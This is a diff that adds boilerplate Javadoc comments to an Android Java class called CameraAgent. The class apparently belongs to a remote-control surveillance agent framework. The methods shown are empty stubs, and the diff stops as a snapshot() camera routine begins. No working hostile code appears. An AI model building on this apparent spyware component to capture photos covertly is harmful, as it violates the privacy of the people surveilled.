@@ -14,35 +14,55 @@ import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.ShutterCallback;
 import android.util.Log;
 
+// TODO: Auto-generated Javadoc
 //SNIPPET
+/**
+ * The Class CameraAgent.
+ */
 public class CameraAgent extends AgentBase {
 
+	/** The TAG. */
 	private final String TAG = "CameraAgent";
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
+	 */
 	@Override
 	public void begin() {
 		// TODO Auto-generated method stub
 
 	}
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
+	 */
 	@Override
 	public void end() {
 		// TODO Auto-generated method stub
 
 	}
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
+	 */
 	@Override
 	public void parse(final byte[] conf) {
 		// TODO Auto-generated method stub
 
 	}
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
+	 */
 	@Override
 	public void go() {
 		// TODO Auto-generated method stub
 
 	}
 
+	/**
+	 * Snapshot.
+	 */
 	private void snapshot() {
 
 		final ShutterCallback shutterCallback = new ShutterCallback() {
